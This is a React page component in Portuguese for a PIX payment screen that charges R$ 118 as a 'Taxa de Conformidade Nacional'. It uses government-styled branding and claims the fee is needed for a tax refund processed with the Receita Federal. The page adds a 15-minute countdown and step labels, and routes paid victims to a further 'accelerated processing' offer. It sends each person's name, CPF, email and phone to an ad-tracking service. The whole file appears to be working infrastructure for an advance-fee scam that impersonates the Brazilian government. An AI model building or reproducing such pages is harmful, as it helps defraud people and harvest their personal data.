import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Clipboard, Copy, AlertCircle, Loader2, CheckCircle2 } from "lucide-react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { useToast } from "@/hooks/use-toast";
import { sendPixGeneratedNotification } from "@/lib/utmify";
import { playNotificationSound } from "@/components/NotificationSound";
import GovHeader from "@/components/GovHeader";

export default function PagamentoTCN() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  
  // Estados para gerenciar o pagamento
  const [pagamentoId, setPagamentoId] = useState("");
  const [pixCode, setPixCode] = useState("");
  const [pixQrCode, setPixQrCode] = useState("");
  const [status, setStatus] = useState<"loading" | "success" | "paid" | "error">("loading");
  const [tempoRestante, setTempoRestante] = useState<number>(900); // 15 minutos em segundos
  const [copiado, setCopiado] = useState(false);
  const [verificandoPagamento, setVerificandoPagamento] = useState(false);
  
  // Dados do cliente da URL
  const nome = searchParams.get("nome") || "";
  const cpf = searchParams.get("cpf") || "";
  const email = searchParams.get("email") || "";
  const telefone = searchParams.get("telefone") || "";
  const valor = searchParams.get("valor") || "";
  const pagamentoAnterId = searchParams.get("pagamento_id") || "";
  const companhia = searchParams.get("companhia") || "";
  const estado = searchParams.get("estado") || "";
  const nasc = searchParams.get("nasc") || "";
  
  // Converter o CPF para formatação apropriada
  const formatarCPF = (cpf: string) => {
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };
  
  // Converter valor para formatação de moeda brasileira
  const formatarMoeda = (valor: string | number) => {
    const numero = typeof valor === 'string' ? parseFloat(valor) : valor;
    return numero.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
  };

  // Copiar o código PIX para a área de transferência
  const copiarPix = async () => {
    if (pixCode) {
      try {
        await navigator.clipboard.writeText(pixCode);
        setCopiado(true);
        toast({
          title: "Código PIX copiado!",
          description: "O código PIX foi copiado para a área de transferência.",
          duration: 3000,
        });
        
        setTimeout(() => setCopiado(false), 3000);
      } catch (err) {
        toast({
          title: "Erro ao copiar código",
          description: "Não foi possível copiar o código PIX automaticamente. Por favor, copie manualmente.",
          variant: "destructive",
          duration: 3000,
        });
      }
    }
  };

  // Formatar o tempo restante em minutos e segundos
  const formatarTempoRestante = () => {
    const minutos = Math.floor(tempoRestante / 60);
    const segundos = tempoRestante % 60;
    return `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
  };

  // Iniciar verificação de status de pagamento
  const verificarStatusPagamento = async (pagamentoId: string) => {
    setVerificandoPagamento(true);
    try {
      const response = await fetch(`/api/pagamentos/${pagamentoId}/status`);
      if (!response.ok) {
        throw new Error('Erro ao verificar o status do pagamento');
      }
      
      const data = await response.json();
      console.log("Status do pagamento:", data);
      
      if (data.status === "PAID" || data.status === "COMPLETED") {
        setStatus("paid");
        
        // Redirecionar para a página de Liberação Acelerada
        const params = new URLSearchParams();
        params.append('nome', nome);
        params.append('cpf', cpf);
        params.append('email', email);
        params.append('telefone', telefone);
        params.append('valor', valor);
        params.append('companhia', companhia);
        params.append('estado', estado);
        params.append('nasc', nasc);
        params.append('pagamento_id', pagamentoId);
        params.append('dataPagamento', new Date().toISOString());
        
        playNotificationSound();
        
        setTimeout(() => {
          setLocation(`/lar?${params.toString()}`);
        }, 2000);
      } else {
        // Continuar verificando a cada 10 segundos
        setTimeout(() => verificarStatusPagamento(pagamentoId), 10000);
      }
    } catch (error) {
      console.error("Erro ao verificar status do pagamento:", error);
      setTimeout(() => verificarStatusPagamento(pagamentoId), 15000);
    }
  };

  // Gerar pagamento PIX
  const gerarPagamentoPix = async () => {
    try {
      setStatus("loading");
      
      // Dados para criação do PIX
      const paymentData = {
        amount: 118, // R$ 118,00
        name: nome,
        email: email,
        cpf: cpf,
        phone: telefone,
        title: "Taxa de Conformidade Nacional (TCN)"
      };
      
      // Chamar API para gerar o PIX
      const response = await fetch('/api/pagamentos', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(paymentData),
      });
      
      if (!response.ok) {
        throw new Error('Erro ao gerar pagamento PIX');
      }
      
      const data = await response.json();
      console.log("Pagamento PIX gerado:", data);
      
      // Atualizar os estados com os dados do pagamento
      setPagamentoId(data.id);
      setPixCode(data.pixCode);
      setPixQrCode(data.pixQrCode);
      setStatus("success");
      
      // Enviar notificação para UTMify
      try {
        await sendPixGeneratedNotification(
          data.id,
          {
            name: nome,
            email: email,
            phone: telefone,
            document: cpf
          },
          11800, // R$ 118,00 em centavos
          undefined,
          "TCN" // Tipo de produto: TCN
        );
      } catch (error) {
        console.error("Erro ao enviar notificação para UTMify:", error);
      }
      
      // Iniciar verificação de status
      verificarStatusPagamento(data.id);
      
      // Iniciar contagem regressiva
      const interval = setInterval(() => {
        setTempoRestante((prev) => {
          if (prev <= 1) {
            clearInterval(interval);
            return 0;
          }
          return prev - 1;
        });
      }, 1000);
      
      return () => clearInterval(interval);
    } catch (error) {
      console.error("Erro ao gerar pagamento PIX:", error);
      setStatus("error");
      
      toast({
        title: "Erro ao gerar pagamento",
        description: "Não foi possível gerar o pagamento PIX. Por favor, tente novamente.",
        variant: "destructive",
        duration: 5000,
      });
    }
  };

  // Gerar pagamento ao carregar a página
  useEffect(() => {
    gerarPagamentoPix();
  }, []);

  return (
    <>
      <GovHeader />
      <Header />
      <main className="bg-[var(--gov-gray-light)] min-h-screen flex flex-col py-8">
        <div className="container mx-auto px-4 max-w-4xl">
          <div className="bg-white rounded-lg shadow-sm p-6 mb-8">
            <div className="text-center mb-8">
              <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)] mb-2">
                Taxa de Conformidade Nacional (TCN)
              </h1>
              <p className="text-[var(--gov-gray-dark)] max-w-2xl mx-auto">
                Esta é a segunda etapa do processo de restituição. Após a confirmação do pagamento,
                seu CPF será registrado no sistema nacional de conformidade fiscal.
              </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
              <Card className="border-blue-200 h-full">
                <CardHeader className="bg-blue-50 border-b border-blue-200">
                  <div className="flex justify-between items-center">
                    <CardTitle className="text-blue-800 text-lg">Informações do Pagamento</CardTitle>
                    <Badge variant="outline" className="bg-blue-100 border-blue-300 text-blue-800">
                      Etapa 2/3
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="pt-6 space-y-4">
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    <span className="text-sm text-gray-500">Taxa:</span>
                    <span className="font-medium">Taxa de Conformidade Nacional</span>
                  </div>
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    <span className="text-sm text-gray-500">Valor:</span>
                    <span className="font-medium text-green-600">R$ 118,00</span>
                  </div>
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    <span className="text-sm text-gray-500">CPF:</span>
                    <span className="font-medium">{formatarCPF(cpf)}</span>
                  </div>
                  <div className="flex justify-between items-center pb-3 border-b border-gray-100">
                    <span className="text-sm text-gray-500">Nome:</span>
                    <span className="font-medium">{nome}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-gray-500">Tempo restante:</span>
                    <span className="font-medium text-orange-600">{formatarTempoRestante()}</span>
                  </div>
                </CardContent>
              </Card>

              <Card className="border-gray-200">
                <CardHeader className="bg-gray-50 border-b border-gray-200">
                  <CardTitle className="text-gray-700">Pagamento via PIX</CardTitle>
                  <CardDescription>
                    Escaneie o QR Code ou copie o código PIX abaixo
                  </CardDescription>
                </CardHeader>
                <CardContent className="flex flex-col items-center pt-6">
                  {status === "loading" && (
                    <div className="flex flex-col items-center justify-center py-8">
                      <Loader2 className="h-12 w-12 text-blue-500 animate-spin mb-4" />
                      <p className="text-gray-500 text-center">Gerando QR Code para pagamento...</p>
                    </div>
                  )}

                  {status === "error" && (
                    <div className="flex flex-col items-center justify-center py-8">
                      <AlertCircle className="h-12 w-12 text-red-500 mb-4" />
                      <p className="text-gray-700 text-center font-medium mb-2">Erro ao gerar o pagamento</p>
                      <p className="text-gray-500 text-center mb-4">Não foi possível gerar o QR Code para pagamento.</p>
                      <Button onClick={gerarPagamentoPix}>Tentar Novamente</Button>
                    </div>
                  )}

                  {status === "success" && (
                    <>
                      <div className="bg-white p-3 border border-gray-200 rounded-lg mb-4">
                        <img 
                          src={pixQrCode} 
                          alt="QR Code PIX" 
                          className="w-48 h-48"
                        />
                      </div>
                      <div className="w-full">
                        <div className="relative">
                          <div className="flex items-center border border-gray-300 rounded-md overflow-hidden mb-4">
                            <div className="bg-gray-100 p-2 border-r border-gray-300">
                              <Clipboard className="h-5 w-5 text-gray-500" />
                            </div>
                            <div className="px-3 py-2 text-sm truncate flex-1 bg-gray-50">
                              {pixCode}
                            </div>
                            <button
                              onClick={copiarPix}
                              className="bg-blue-500 hover:bg-blue-600 text-white p-2 transition"
                            >
                              {copiado ? (
                                <CheckCircle2 className="h-5 w-5" />
                              ) : (
                                <Copy className="h-5 w-5" />
                              )}
                            </button>
                          </div>
                        </div>
                      </div>
                    </>
                  )}

                  {status === "paid" && (
                    <div className="flex flex-col items-center justify-center py-8">
                      <div className="rounded-full bg-green-100 p-3 mb-3">
                        <CheckCircle2 className="h-8 w-8 text-green-600" />
                      </div>
                      <h3 className="text-lg font-bold text-green-700 mb-2">Pagamento Aprovado!</h3>
                      <p className="text-gray-600 text-center">
                        Seu pagamento foi confirmado com sucesso.
                        <br />Você será redirecionado em instantes...
                      </p>
                      <div className="mt-4">
                        <Loader2 className="h-5 w-5 text-blue-500 animate-spin" />
                      </div>
                    </div>
                  )}
                </CardContent>
                <CardFooter className="bg-gray-50 border-t border-gray-200 flex flex-col">
                  <p className="text-sm text-gray-500 mb-2">
                    <span className="font-medium">Importante:</span> Este PIX possui tempo limite de 15 minutos.
                  </p>
                </CardFooter>
              </Card>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-lg p-5 mb-6">
              <h3 className="text-lg font-semibold text-blue-800 mb-3">
                Por que a Taxa de Conformidade Nacional é necessária?
              </h3>
              <div className="text-blue-700 space-y-3">
                <p>
                  A TCN é uma etapa obrigatória para que sua restituição seja processada oficialmente no sistema federal. Esta taxa:
                </p>
                <ul className="list-disc list-inside space-y-1 ml-2">
                  <li>Emite o termo de conformidade fiscal do CPF beneficiário</li>
                  <li>Formaliza o processo junto à Receita Federal</li>
                  <li>Valida os dados bancários para recebimento do crédito</li>
                  <li>Garante o direito à restituição dos valores cobrados indevidamente</li>
                </ul>
                <p className="pt-2">
                  <span className="font-semibold">Após a confirmação deste pagamento:</span> Seu processo entrará na fase final, onde
                  será oferecida a opção de processamento acelerado (opcional).
                </p>
              </div>
            </div>

            <div className="border-t border-gray-200 pt-4">
              <div className="flex justify-between items-center">
                <div className="text-sm text-gray-500">
                  {verificandoPagamento ? (
                    <div className="flex items-center">
                      <Loader2 className="h-4 w-4 mr-2 animate-spin text-blue-500" />
                      <span>Verificando pagamento...</span>
                    </div>
                  ) : (
                    <span>Aguardando pagamento PIX</span>
                  )}
                </div>
                <div>
                  <Button variant="outline" className="text-sm" onClick={() => window.print()}>
                    Imprimir Comprovante
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}